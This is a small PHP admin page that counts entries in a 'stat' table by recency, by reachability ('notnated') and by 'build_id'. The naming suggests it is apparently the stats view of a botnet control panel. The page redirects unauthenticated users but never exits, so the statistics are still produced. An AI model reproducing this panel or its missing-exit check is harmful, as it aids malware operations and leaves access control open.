<?

require_once "common.php";

if (!check_auth() || !isset($_SESSION['admin']))
{
      logout();
      header("location: index.php");
}

$r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`last_request`<".($opt['request_timeout']*60));
$smarty->assign("btotal", intval(mysql_result($r, 0, 0)));

$r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat` WHERE `ping`>0 AND ".time()."-`last_request`<".($opt['request_timeout']*60));
$smarty->assign("notnated", intval(mysql_result($r, 0, 0)));

$r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`last_request`<".(60*60));
$smarty->assign("bhour", intval(mysql_result($r, 0, 0)));

$r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`last_request`<".(60*60*24));
$smarty->assign("bday", intval(mysql_result($r, 0, 0)));

$r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat`");
$smarty->assign("ball", intval(mysql_result($r, 0, 0)));

$builds = array();
$sql = "SELECT COUNT(*) AS `cnt`, `build_id` FROM `stat` GROUP BY `build_id`";
$r = db_query($sql);
while ($f = mysql_fetch_array($r))
      $builds[] = array('build_id' => $f['build_id'], 'cnt' => $f['cnt']);

$smarty->assign("builds", $builds);

$smarty->assign("tpl", "info.tpl");
$smarty->display("index.tpl");

?>